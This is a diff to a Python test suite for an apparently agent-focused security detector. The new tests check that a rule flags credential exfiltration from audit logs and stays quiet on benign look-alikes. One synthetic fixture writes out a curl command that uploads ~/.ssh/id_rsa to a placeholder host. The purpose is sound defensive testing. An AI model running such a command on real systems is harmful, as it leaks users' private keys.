@@ -1,9 +1,10 @@
 from __future__ import annotations
 
+from agentsec.chains import build_behavior_chains
 from agentsec.config import DEFAULT_RULES
 from agentsec.config import load_config
 from agentsec.llm import LLMAnalyzer
-from agentsec.models import DetectionResult, Event
+from agentsec.models import DetectionResult, Event, SampleFeatures
 from agentsec.pipeline import apply_llm_correction
 from agentsec.rules import RuleEngine
 from agentsec.scoring import score_hits
@@ -560,8 +561,8 @@ def test_balanced_credential_package_network_context_is_candidate_only() -> None
             md5="synthetic",
             source="audit",
             event_type="path",
-            text='type=PATH name="/workspace/credentials/app.secret"',
-            fields={"name": "/workspace/credentials/app.secret"},
+            text='type=PATH name="/home/demo/.ssh/id_rsa"',
+            fields={"name": "/home/demo/.ssh/id_rsa"},
         ),
         Event(
             md5="synthetic",
@@ -586,6 +587,149 @@ def test_balanced_credential_package_network_context_is_candidate_only() -> None
     assert "R115" in {hit.rule_id for hit in precision_hits}
     assert precision_label == 0
     assert precision_score < _precision_config["scoring"]["score_threshold"]
+
+
+def test_real_command_credential_exfil_triggers_r117() -> None:
+    _balanced_config, balanced_rules = load_config("configs/default.yaml", profile="balanced")
+    events = [
+        Event(
+            md5="synthetic",
+            source="audit",
+            event_type="path",
+            text='type=PATH name="/home/demo/.ssh/id_rsa"',
+            fields={"name": "/home/demo/.ssh/id_rsa"},
+        ),
+        Event(
+            md5="synthetic",
+            source="audit",
+            event_type="execve",
+            text='type=EXECVE a0="curl" a1="--upload-file" a2="/home/demo/.ssh/id_rsa" a3="https://upload.invalid/collect"',
+            fields={"a0": "curl", "a1": "--upload-file", "a2": "/home/demo/.ssh/id_rsa", "a3": "https://upload.invalid/collect"},
+        ),
+    ]
+
+    hits, signals = RuleEngine(balanced_rules).evaluate(events, {"http_post_count": 0, "dst_ports": []})
+    score, label, _risk = score_hits(hits, _balanced_config["scoring"], signals)
+    chains = build_behavior_chains("synthetic", hits, SampleFeatures(md5="synthetic", signals=signals))
+
+    assert "R117" in {hit.rule_id for hit in hits}
+    assert "R117" in signals["strong_chain_rules"]
+    assert signals["credential_file_path"] is True
+    assert signals["real_command_context"] is True
+    assert signals["network_transfer"] is True
+    assert label == 1
+    assert score >= _balanced_config["scoring"]["score_threshold"]
+    assert any(chain["title"] == "Credential file access with real command exfiltration" for chain in chains)
+
+
+def test_message_credential_discussion_does_not_trigger_r117() -> None:
+    _balanced_config, balanced_rules = load_config("configs/default.yaml", profile="balanced")
+    events = [
+        Event(
+            md5="synthetic",
+            source="session",
+            event_type="message",
+            text="Let's discuss token handling, secret storage, and ~/.ssh/id_rsa references without reading files.",
+            fields={"content": "API key and id_rsa discussion only"},
+        )
+    ]
+
+    hits, signals = RuleEngine(balanced_rules).evaluate(events, {"http_post_count": 0, "dst_ports": []})
+    score, label, _risk = score_hits(hits, _balanced_config["scoring"], signals)
+
+    assert "R117" not in {hit.rule_id for hit in hits}
+    assert signals["strong_chain"] is False
+    assert label == 0
+    assert score < _balanced_config["scoring"]["score_threshold"]
+
+
+def test_openai_compatible_data_post_does_not_trigger_r117() -> None:
+    _balanced_config, balanced_rules = load_config("configs/default.yaml", profile="balanced")
+    events = [
+        Event(
+            md5="synthetic",
+            source="audit",
+            event_type="path",
+            text='type=PATH name="/home/demo/.ssh/id_rsa"',
+            fields={"name": "/home/demo/.ssh/id_rsa"},
+        ),
+        Event(
+            md5="synthetic",
+            source="audit",
+            event_type="execve",
+            text='type=EXECVE a0="curl" a1="-d" a2="{\\"messages\\":[]}" a3="http://127.0.0.1:8000/v1/chat/completions"',
+            fields={"a0": "curl", "a1": "-d", "a2": '{"messages":[]}', "a3": "http://127.0.0.1:8000/v1/chat/completions"},
+        ),
+    ]
+
+    hits, signals = RuleEngine(balanced_rules).evaluate(events, {"http_post_count": 0, "dst_ports": []})
+    score, label, _risk = score_hits(hits, _balanced_config["scoring"], signals)
+
+    assert "R004" not in {hit.rule_id for hit in hits}
+    assert "R117" not in {hit.rule_id for hit in hits}
+    assert signals["network_transfer"] is False
+    assert signals["strong_chain"] is False
+    assert label == 0
+    assert score < _balanced_config["scoring"]["score_threshold"]
+
+
+def test_r002_with_network_observed_alone_does_not_trigger_r117() -> None:
+    _balanced_config, balanced_rules = load_config("configs/default.yaml", profile="balanced")
+    events = [
+        Event(
+            md5="synthetic",
+            source="audit",
+            event_type="path",
+            text='type=PATH name="/home/demo/.ssh/id_rsa"',
+            fields={"name": "/home/demo/.ssh/id_rsa"},
+        )
+    ]
+    pcap = {"http_post_count": 0, "external_ip_count": 1, "dst_ports": [443]}
+
+    hits, signals = RuleEngine(balanced_rules).evaluate(events, pcap)
+    score, label, _risk = score_hits(hits, _balanced_config["scoring"], signals)
+
+    assert "R002" in {hit.rule_id for hit in hits}
+    assert "R117" not in {hit.rule_id for hit in hits}
+    assert signals["network_observed"] is True
+    assert signals["network_transfer"] is False
+    assert signals["strong_chain"] is False
+    assert label == 0
+    assert score < _balanced_config["scoring"]["score_threshold"]
+
+
+def test_weak_rules_with_network_context_without_real_exfil_stay_benign() -> None:
+    _balanced_config, balanced_rules = load_config("configs/default.yaml", profile="balanced")
+    events = [
+        Event(
+            md5="synthetic",
+            source="audit",
+            event_type="path",
+            text='type=PATH name="/workspace/credentials/app.secret"',
+            fields={"name": "/workspace/credentials/app.secret"},
+        ),
+        Event(
+            md5="synthetic",
+            source="audit",
+            event_type="execve",
+            text='type=EXECVE a0="bash" a1="-lc" a2="python /tmp/check.py /workspace"',
+            fields={"a0": "bash", "a1": "-lc", "a2": "python /tmp/check.py /workspace"},
+        ),
+    ]
+    pcap = {"http_post_count": 0, "external_ip_count": 1, "dst_ports": [443]}
+
+    hits, signals = RuleEngine(balanced_rules).evaluate(events, pcap)
+    score, label, _risk = score_hits(hits, _balanced_config["scoring"], signals)
+
+    assert {"R001", "R002", "R011"}.issubset({hit.rule_id for hit in hits})
+    assert "R114" in signals["chain_candidates"]
+    assert "R117" not in {hit.rule_id for hit in hits}
+    assert signals["real_command_context"] is True
+    assert signals["network_observed"] is True
+    assert signals["network_transfer"] is False
+    assert signals["strong_chain"] is False
+    assert label == 0
+    assert score < _balanced_config["scoring"]["score_threshold"]
 
 
 def test_nested_sysmon_eventdata_fields_are_mapped(tmp_path) -> None:
